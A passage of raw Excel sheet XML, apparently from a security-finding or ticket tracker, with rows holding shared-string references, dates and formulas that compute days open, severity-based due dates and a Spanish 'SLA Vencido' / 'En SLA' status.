      <c r="Q184" s="9" t="s">
        <v>2776</v>
      </c>
      <c r="R184" s="4"/>
      <c r="S184" s="22"/>
      <c r="T184" s="8">
        <v>45689</v>
      </c>
      <c r="U184" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V184" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W184" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X184" s="11"/>
      <c r="Y184" s="11"/>
      <c r="Z184" s="11"/>
      <c r="AA184" s="8"/>
      <c r="AB184" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC184" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD184" s="32"/>
      <c r="AE184" s="27"/>
      <c r="AF184" s="9"/>
      <c r="AG184" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="185" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A185" s="5">
        <v>184</v>
      </c>
      <c r="B185" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C185" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D185" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E185" s="4"/>
      <c r="F185" s="4"/>
      <c r="G185" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H185" s="9" t="s">
        <v>2777</v>
      </c>
      <c r="I185" s="6"/>
      <c r="J185" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K185" s="4"/>
      <c r="L185" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M185" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N185" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O185" s="6"/>
      <c r="P185" s="6"/>
      <c r="Q185" s="9" t="s">
        <v>2778</v>
      </c>
      <c r="R185" s="4"/>
      <c r="S185" s="22"/>
      <c r="T185" s="8">
        <v>45689</v>
      </c>
      <c r="U185" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V185" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W185" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X185" s="11"/>
      <c r="Y185" s="11"/>
      <c r="Z185" s="11"/>
      <c r="AA185" s="8"/>
      <c r="AB185" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC185" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD185" s="32"/>
      <c r="AE185" s="27"/>
      <c r="AF185" s="9"/>
      <c r="AG185" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="186" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A186" s="5">
        <v>185</v>
      </c>
      <c r="B186" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C186" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D186" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E186" s="4"/>
      <c r="F186" s="4"/>
      <c r="G186" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H186" s="9" t="s">
        <v>2779</v>
      </c>
      <c r="I186" s="6"/>
      <c r="J186" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K186" s="4"/>
      <c r="L186" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M186" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N186" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O186" s="6"/>
      <c r="P186" s="6"/>
      <c r="Q186" s="9" t="s">
        <v>2780</v>
      </c>
      <c r="R186" s="4"/>
      <c r="S186" s="22"/>
      <c r="T186" s="8">
        <v>45689</v>
      </c>
      <c r="U186" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V186" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W186" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X186" s="11"/>
      <c r="Y186" s="11"/>
      <c r="Z186" s="11"/>
      <c r="AA186" s="8"/>
      <c r="AB186" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC186" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD186" s="32"/>
      <c r="AE186" s="27"/>
      <c r="AF186" s="9"/>
      <c r="AG186" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="187" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A187" s="5">
        <v>186</v>
      </c>
      <c r="B187" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C187" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D187" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E187" s="4"/>
      <c r="F187" s="4"/>
      <c r="G187" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H187" s="9" t="s">
        <v>2781</v>
      </c>
      <c r="I187" s="6"/>
      <c r="J187" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K187" s="4"/>
      <c r="L187" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M187" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N187" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O187" s="6"/>
      <c r="P187" s="6"/>
      <c r="Q187" s="9" t="s">
        <v>2782</v>
      </c>
      <c r="R187" s="4"/>
      <c r="S187" s="22"/>
      <c r="T187" s="8">
        <v>45689</v>
      </c>
      <c r="U187" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V187" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W187" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X187" s="11"/>
      <c r="Y187" s="11"/>
      <c r="Z187" s="11"/>
      <c r="AA187" s="8"/>
      <c r="AB187" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC187" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD187" s="32"/>
      <c r="AE187" s="27"/>
      <c r="AF187" s="9"/>
      <c r="AG187" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="188" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A188" s="5">
        <v>187</v>
      </c>
      <c r="B188" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C188" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D188" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E188" s="4"/>
      <c r="F188" s="4"/>
      <c r="G188" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H188" s="9" t="s">
        <v>2783</v>
      </c>
      <c r="I188" s="6"/>
      <c r="J188" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K188" s="4"/>
      <c r="L188" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M188" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N188" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O188" s="6"/>
      <c r="P188" s="6"/>
      <c r="Q188" s="9" t="s">
        <v>2784</v>
      </c>
      <c r="R188" s="4"/>
      <c r="S188" s="22"/>
      <c r="T188" s="8">
        <v>44885</v>
      </c>
      <c r="U188" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1324</v>
      </c>
      <c r="V188" s="8">
        <f t="shared" si="7"/>
        <v>44975</v>
      </c>
      <c r="W188" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X188" s="11"/>
      <c r="Y188" s="11"/>
      <c r="Z188" s="11"/>
      <c r="AA188" s="8"/>
      <c r="AB188" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC188" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD188" s="32"/>
      <c r="AE188" s="27"/>
      <c r="AF188" s="9"/>
      <c r="AG188" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="189" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A189" s="5">
        <v>188</v>
      </c>
      <c r="B189" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C189" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D189" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E189" s="4"/>
      <c r="F189" s="4"/>
      <c r="G189" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H189" s="9" t="s">
        <v>2785</v>
      </c>
      <c r="I189" s="6"/>
      <c r="J189" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K189" s="4"/>
      <c r="L189" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M189" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N189" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O189" s="6"/>
      <c r="P189" s="6"/>
      <c r="Q189" s="9" t="s">
        <v>2786</v>
      </c>
      <c r="R189" s="4"/>
      <c r="S189" s="22"/>
      <c r="T189" s="8">
        <v>45689</v>
      </c>
      <c r="U189" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V189" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W189" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X189" s="11"/>
      <c r="Y189" s="11"/>
      <c r="Z189" s="11"/>
      <c r="AA189" s="8"/>
      <c r="AB189" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC189" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD189" s="32"/>
      <c r="AE189" s="27"/>
      <c r="AF189" s="9"/>
      <c r="AG189" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="190" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A190" s="5">
        <v>189</v>
      </c>
      <c r="B190" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C190" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D190" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E190" s="4"/>
      <c r="F190" s="4"/>
      <c r="G190" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H190" s="9" t="s">
        <v>2787</v>
      </c>
      <c r="I190" s="6"/>
      <c r="J190" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K190" s="4"/>
      <c r="L190" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M190" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N190" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O190" s="6"/>
      <c r="P190" s="6"/>
      <c r="Q190" s="9" t="s">
        <v>2788</v>
      </c>
      <c r="R190" s="4"/>
      <c r="S190" s="22"/>
      <c r="T190" s="8">
        <v>45689</v>
      </c>
      <c r="U190" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>520</v>
      </c>
      <c r="V190" s="8">
        <f t="shared" si="7"/>
        <v>45779</v>
      </c>
      <c r="W190" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X190" s="11"/>
      <c r="Y190" s="11"/>
      <c r="Z190" s="11"/>
      <c r="AA190" s="8"/>
      <c r="AB190" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC190" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD190" s="32"/>
      <c r="AE190" s="27"/>
      <c r="AF190" s="9"/>
      <c r="AG190" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="191" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A191" s="5">
        <v>190</v>
      </c>
      <c r="B191" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C191" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D191" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E191" s="4"/>
      <c r="F191" s="4"/>
      <c r="G191" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H191" s="9" t="s">
        <v>2789</v>
      </c>
      <c r="I191" s="6"/>
      <c r="J191" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K191" s="4"/>
      <c r="L191" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M191" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N191" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O191" s="6"/>
      <c r="P191" s="6"/>
      <c r="Q191" s="9" t="s">
        <v>2790</v>
      </c>
      <c r="R191" s="4"/>
      <c r="S191" s="22"/>
      <c r="T191" s="8">
        <v>45710</v>
      </c>
      <c r="U191" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>499</v>
      </c>
      <c r="V191" s="8">
        <f t="shared" si="7"/>
        <v>45800</v>
      </c>
      <c r="W191" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X191" s="11"/>
      <c r="Y191" s="11"/>
      <c r="Z191" s="11"/>
      <c r="AA191" s="8"/>
      <c r="AB191" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC191" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD191" s="32"/>
      <c r="AE191" s="27"/>
      <c r="AF191" s="9"/>
      <c r="AG191" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="192" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A192" s="5">
        <v>191</v>
      </c>
      <c r="B192" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C192" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D192" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E192" s="4"/>
      <c r="F192" s="4"/>
      <c r="G192" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H192" s="9" t="s">
        <v>2791</v>
      </c>
      <c r="I192" s="6"/>
      <c r="J192" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K192" s="4"/>
      <c r="L192" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M192" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N192" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O192" s="6"/>
      <c r="P192" s="6"/>
      <c r="Q192" s="9" t="s">
        <v>2792</v>
      </c>
      <c r="R192" s="4"/>
      <c r="S192" s="22"/>
      <c r="T192" s="8">
        <v>44652</v>
      </c>
      <c r="U192" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1557</v>
      </c>
      <c r="V192" s="8">
        <f t="shared" si="7"/>
        <v>44742</v>
      </c>
      <c r="W192" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X192" s="11"/>
      <c r="Y192" s="11"/>
      <c r="Z192" s="11"/>
      <c r="AA192" s="8"/>
      <c r="AB192" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC192" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD192" s="32"/>
      <c r="AE192" s="27"/>
      <c r="AF192" s="9"/>
      <c r="AG192" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="193" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A193" s="5">
        <v>192</v>
      </c>
      <c r="B193" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C193" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D193" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E193" s="4"/>
      <c r="F193" s="4"/>
      <c r="G193" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H193" s="9" t="s">
        <v>2793</v>
      </c>
      <c r="I193" s="6"/>
      <c r="J193" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K193" s="4"/>
      <c r="L193" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M193" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N193" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O193" s="6"/>
      <c r="P193" s="6"/>
      <c r="Q193" s="9" t="s">
        <v>2794</v>
      </c>
      <c r="R193" s="4"/>
      <c r="S193" s="22"/>
      <c r="T193" s="8">
        <v>44548</v>
      </c>
      <c r="U193" s="11">
        <f t="shared" ca="1" si="6"/>
        <v>1661</v>
      </c>
      <c r="V193" s="8">
        <f t="shared" si="7"/>
        <v>44638</v>
      </c>
      <c r="W193" s="12" t="str">
        <f t="shared" ca="1" si="8"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X193" s="11"/>
      <c r="Y193" s="11"/>
      <c r="Z193" s="11"/>
      <c r="AA193" s="8"/>
      <c r="AB193" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC193" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD193" s="32"/>
      <c r="AE193" s="27"/>
      <c r="AF193" s="9"/>
      <c r="AG193" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="194" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A194" s="5">
        <v>193</v>
      </c>
      <c r="B194" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C194" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D194" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E194" s="4"/>
      <c r="F194" s="4"/>
      <c r="G194" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H194" s="9" t="s">
        <v>2795</v>
      </c>
      <c r="I194" s="6"/>
      <c r="J194" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K194" s="4"/>
      <c r="L194" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M194" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N194" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O194" s="6"/>
      <c r="P194" s="6"/>
      <c r="Q194" s="9" t="s">
        <v>2796</v>
      </c>
      <c r="R194" s="4"/>
      <c r="S194" s="22"/>
      <c r="T194" s="8">
        <v>44582</v>
      </c>
      <c r="U194" s="11">
        <f t="shared" ref="U194:U257" ca="1" si="9">TODAY()-T194</f>
        <v>1627</v>
      </c>
      <c r="V194" s="8">
        <f t="shared" ref="V194:V259" si="10">IF(M194="Critical",T194+10,IF(M194="High",T194+30,IF(M194="Bad",T194+30,IF(M194="Medium",T194+90,IF(M194="Warm",T194+90,IF(M194="Low",T194+120,IF(M194="Fair",T194+120,IF(M194="Neutral",T194+120,""))))))))</f>
        <v>44672</v>
      </c>
      <c r="W194" s="12" t="str">
        <f t="shared" ref="W194:W259" ca="1" si="11">IF(M194="Critical",IF(U194&gt;10,"SLA Vencido","En SLA"),IF(M194="High",IF(U194&gt;30,"SLA Vencido","En SLA"),IF(M194="Bad",IF(U194&gt;30,"SLA Vencido","En SLA"),IF(M194="Medium",IF(U194&gt;90,"SLA Vencido","En SLA"),IF(M194="Warm",IF(U194&gt;90,"SLA Vencido","En SLA"),IF(M194="Low",IF(U194&gt;120,"SLA Vencido","En SLA"),IF(M194="Fair",IF(U194&gt;120,"SLA Vencido","En SLA"),IF(M194="Neutral",IF(U194&gt;120,"SLA Vencido","En SLA"),"Error"))))))))</f>
        <v>SLA Vencido</v>
      </c>
      <c r="X194" s="11"/>
      <c r="Y194" s="11"/>
      <c r="Z194" s="11"/>
      <c r="AA194" s="8"/>
      <c r="AB194" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC194" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD194" s="32"/>
      <c r="AE194" s="27"/>
      <c r="AF194" s="9"/>
      <c r="AG194" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="195" spans="1:33" ht="43.5" x14ac:dyDescent="0.35">
      <c r="A195" s="5">
        <v>194</v>
      </c>
      <c r="B195" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C195" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D195" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E195" s="4"/>
      <c r="F195" s="4"/>
      <c r="G195" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H195" s="9" t="s">
        <v>2797</v>
      </c>
      <c r="I195" s="6"/>
      <c r="J195" s="4" t="s">
        <v>1325</v>
      </c>
      <c r="K195" s="4"/>
      <c r="L195" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M195" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N195" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O195" s="6"/>
      <c r="P195" s="6"/>
      <c r="Q195" s="9" t="s">
        <v>2798</v>
      </c>
      <c r="R195" s="4"/>
      <c r="S195" s="22"/>
      <c r="T195" s="8">
        <v>45696</v>
      </c>
      <c r="U195" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>513</v>
      </c>
      <c r="V195" s="8">
        <f t="shared" si="10"/>
        <v>45786</v>
      </c>
      <c r="W195" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X195" s="11"/>
      <c r="Y195" s="11"/>
      <c r="Z195" s="11"/>
      <c r="AA195" s="8"/>
      <c r="AB195" s="9" t="s">
        <v>1328</v>
      </c>
      <c r="AC195" s="32" t="s">
        <v>1329</v>
      </c>
      <c r="AD195" s="32"/>
      <c r="AE195" s="27"/>
      <c r="AF195" s="9"/>
      <c r="AG195" s="27" t="s">
        <v>1823</v>
      </c>
    </row>
    <row r="196" spans="1:33" ht="29" x14ac:dyDescent="0.35">
      <c r="A196" s="5">
        <v>195</v>
      </c>
      <c r="B196" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C196" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D196" s="5" t="s">
        <v>34</v>
      </c>
      <c r="E196" s="4"/>
      <c r="F196" s="4"/>
      <c r="G196" s="6" t="s">
        <v>2067</v>
      </c>
      <c r="H196" s="9" t="s">
        <v>2799</v>
      </c>
      <c r="I196" s="6"/>
      <c r="J196" s="4" t="s">
        <v>971</v>
      </c>
      <c r="K196" s="4"/>
      <c r="L196" s="5" t="s">
        <v>141</v>
      </c>
      <c r="M196" s="5" t="s">
        <v>61</v>
      </c>
      <c r="N196" s="5" t="s">
        <v>1326</v>
      </c>
      <c r="O196" s="6"/>
      <c r="P196" s="6"/>
      <c r="Q196" s="9" t="s">
        <v>2800</v>
      </c>
      <c r="R196" s="4"/>
      <c r="S196" s="22"/>
      <c r="T196" s="8">
        <v>45696</v>
      </c>
      <c r="U196" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>513</v>
      </c>
      <c r="V196" s="8">
        <f t="shared" si="10"/>
        <v>45786</v>
      </c>
      <c r="W196" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X196" s="11"/>
      <c r="Y196" s="11"/>
      <c r="Z196" s="11"/>
      <c r="AA196" s="8"/>
      <c r="AB196" s="9" t="s">
        <v>1005</v>
      </c>
      <c r="AC196" s="32" t="s">
        <v>957</v>
      </c>
      <c r="AD196" s="32"/>
      <c r="AE196" s="27"/>
      <c r="AF196" s="9"/>
      <c r="AG196" s="27" t="s">
        <v>2060</v>
      </c>
    </row>
    <row r="197" spans="1:33" ht="58" x14ac:dyDescent="0.35">
      <c r="A197" s="5">
        <v>196</v>
      </c>
      <c r="B197" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C197" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D197" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E197" s="4"/>
      <c r="F197" s="4"/>
      <c r="G197" s="4" t="s">
        <v>2801</v>
      </c>
      <c r="H197" s="9" t="s">
        <v>2802</v>
      </c>
      <c r="I197" s="6"/>
      <c r="J197" s="4" t="s">
        <v>2803</v>
      </c>
      <c r="K197" s="4"/>
      <c r="L197" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M197" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N197" s="5" t="s">
        <v>2804</v>
      </c>
      <c r="O197" s="6"/>
      <c r="P197" s="6"/>
      <c r="Q197" s="9" t="s">
        <v>2805</v>
      </c>
      <c r="R197" s="4"/>
      <c r="S197" s="22"/>
      <c r="T197" s="8">
        <v>45703</v>
      </c>
      <c r="U197" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>506</v>
      </c>
      <c r="V197" s="8">
        <f t="shared" si="10"/>
        <v>45733</v>
      </c>
      <c r="W197" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X197" s="11"/>
      <c r="Y197" s="11"/>
      <c r="Z197" s="11"/>
      <c r="AA197" s="8"/>
      <c r="AB197" s="9" t="s">
        <v>2806</v>
      </c>
      <c r="AC197" s="32" t="s">
        <v>2807</v>
      </c>
      <c r="AD197" s="32"/>
      <c r="AE197" s="27"/>
      <c r="AF197" s="9"/>
      <c r="AG197" s="9" t="s">
        <v>2808</v>
      </c>
    </row>
    <row r="198" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A198" s="5">
        <v>197</v>
      </c>
      <c r="B198" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C198" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D198" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E198" s="4"/>
      <c r="F198" s="4"/>
      <c r="G198" s="4" t="s">
        <v>2801</v>
      </c>
      <c r="H198" s="9" t="s">
        <v>2809</v>
      </c>
      <c r="I198" s="6"/>
      <c r="J198" s="4" t="s">
        <v>2810</v>
      </c>
      <c r="K198" s="4"/>
      <c r="L198" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M198" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N198" s="5" t="s">
        <v>2811</v>
      </c>
      <c r="O198" s="6"/>
      <c r="P198" s="6"/>
      <c r="Q198" s="9" t="s">
        <v>2805</v>
      </c>
      <c r="R198" s="4">
        <v>53</v>
      </c>
      <c r="S198" s="22"/>
      <c r="T198" s="8">
        <v>45703</v>
      </c>
      <c r="U198" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>506</v>
      </c>
      <c r="V198" s="8">
        <f t="shared" si="10"/>
        <v>45733</v>
      </c>
      <c r="W198" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X198" s="11"/>
      <c r="Y198" s="11"/>
      <c r="Z198" s="11"/>
      <c r="AA198" s="8"/>
      <c r="AB198" s="9" t="s">
        <v>2812</v>
      </c>
      <c r="AC198" s="32" t="s">
        <v>2813</v>
      </c>
      <c r="AD198" s="32"/>
      <c r="AE198" s="27"/>
      <c r="AF198" s="9"/>
      <c r="AG198" s="9" t="s">
        <v>2808</v>
      </c>
    </row>
    <row r="199" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A199" s="5">
        <v>198</v>
      </c>
      <c r="B199" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C199" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D199" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E199" s="4"/>
      <c r="F199" s="4"/>
      <c r="G199" s="4" t="s">
        <v>2801</v>
      </c>
      <c r="H199" s="9" t="s">
        <v>2814</v>
      </c>
      <c r="I199" s="6"/>
      <c r="J199" s="4" t="s">
        <v>2810</v>
      </c>
      <c r="K199" s="4"/>
      <c r="L199" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M199" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N199" s="5" t="s">
        <v>2811</v>
      </c>
      <c r="O199" s="6"/>
      <c r="P199" s="6"/>
      <c r="Q199" s="9" t="s">
        <v>2805</v>
      </c>
      <c r="R199" s="4">
        <v>53</v>
      </c>
      <c r="S199" s="22"/>
      <c r="T199" s="8">
        <v>45703</v>
      </c>
      <c r="U199" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>506</v>
      </c>
      <c r="V199" s="8">
        <f t="shared" si="10"/>
        <v>45733</v>
      </c>
      <c r="W199" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X199" s="11"/>
      <c r="Y199" s="11"/>
      <c r="Z199" s="11"/>
      <c r="AA199" s="8"/>
      <c r="AB199" s="9" t="s">
        <v>2812</v>
      </c>
      <c r="AC199" s="32" t="s">
        <v>2813</v>
      </c>
      <c r="AD199" s="32"/>
      <c r="AE199" s="27"/>
      <c r="AF199" s="9"/>
      <c r="AG199" s="9" t="s">
        <v>2808</v>
      </c>
    </row>
    <row r="200" spans="1:33" ht="261" x14ac:dyDescent="0.35">
      <c r="A200" s="5">
        <v>199</v>
      </c>
      <c r="B200" s="21" t="s">
        <v>2044</v>
      </c>
      <c r="C200" s="5" t="s">
        <v>225</v>
      </c>
      <c r="D200" s="5" t="s">
        <v>371</v>
      </c>
      <c r="E200" s="4"/>
      <c r="F200" s="4"/>
      <c r="G200" s="4" t="s">
        <v>2801</v>
      </c>
      <c r="H200" s="9" t="s">
        <v>2815</v>
      </c>
      <c r="I200" s="6"/>
      <c r="J200" s="4" t="s">
        <v>2816</v>
      </c>
      <c r="K200" s="4"/>
      <c r="L200" s="5" t="s">
        <v>41</v>
      </c>
      <c r="M200" s="5" t="s">
        <v>522</v>
      </c>
      <c r="N200" s="5" t="s">
        <v>2811</v>
      </c>
      <c r="O200" s="6"/>
      <c r="P200" s="6"/>
      <c r="Q200" s="9" t="s">
        <v>2805</v>
      </c>
      <c r="R200" s="4">
        <v>53</v>
      </c>
      <c r="S200" s="22"/>
      <c r="T200" s="8">
        <v>45703</v>
      </c>
      <c r="U200" s="11">
        <f t="shared" ca="1" si="9"/>
        <v>506</v>
      </c>
      <c r="V200" s="8">
        <f t="shared" si="10"/>
        <v>45733</v>
      </c>
      <c r="W200" s="12" t="str">
        <f t="shared" ca="1" si="11"/>
        <v>SLA Vencido</v>
      </c>
      <c r="X200" s="11"/>
